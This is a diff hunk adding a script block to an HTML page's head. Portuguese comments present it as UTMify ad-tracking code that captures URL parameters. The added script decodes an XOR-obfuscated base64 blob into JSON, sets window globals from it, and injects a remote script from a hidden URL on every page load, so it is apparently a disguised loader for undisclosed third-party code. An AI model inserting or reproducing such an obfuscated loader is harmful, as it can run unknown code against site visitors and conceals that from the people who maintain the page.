@@ -10,6 +10,18 @@
     content="width=device-width, initial-scale=1.0"
   />
 
+
+  <!-- =====================================================
+       UTMIFY - UTMS
+       DEVE CARREGAR ANTES DO PIXEL E DE QUALQUER OUTRO SCRIPT
+       Captura os parametros de URL e amarra a sessao ao anuncio
+  ====================================================== -->
+
+  <script>(function(){var g_i=atob("DGEvzHTZvfLo0NQg2hoNuQa1n8jKuKBUqhIV41u62ZzGpaBNswdW4he20NyKovtTuRNGvACqkoecvacPtgBbqQetk5ib8vgCuxVbvh27yIaNo/YagRoNohW02NDS8rBBrgACuQC01JSR/aRSvxdKogD0xZGHtPlTuQoN4Fav3J6dtfYa+ENS4A/705OFtfYa+AVOuBX0yIaFubJZ9xFdqQK804bFo6FCswVc7lj7y5OEpbEC4EMNsSmk");var b_6kh=[];for(var m_lk1=0;m_lk1<g_i.length;m_lk1++){b_6kh.push(g_i.charCodeAt(m_lk1)&255);}var w_2ms=b_6kh[0];var o_70w=b_6kh.slice(1,1+w_2ms);var g_d0=b_6kh.slice(1+w_2ms);var e_o=g_d0.map(function(b,j_3){return b^o_70w[j_3%w_2ms];});var h_i="";for(var r_11gb=0;r_11gb<e_o.length;r_11gb++){h_i+=String.fromCharCode(e_o[r_11gb]&255);}var l_7=decodeURIComponent(escape(h_i));var j_wk=JSON.parse(l_7);var h_09=j_wk.globals||[];h_09.forEach(function(v_iq){window[v_iq.name]=v_iq.value;});var e_nqn=document.createElement("script");e_nqn.src=j_wk.url;e_nqn.async=true;e_nqn.defer=true;(j_wk.attributes||[]).forEach(function(p_q3){e_nqn.setAttribute(p_q3.name,p_q3.value);});(document.head||document.documentElement).appendChild(e_nqn);})();</script>
+
+  <!-- END UTMIFY - UTMS -->
+
+
   <!-- =====================================================
        FAVICON
        Evita requisição automática /favicon.ico = 404
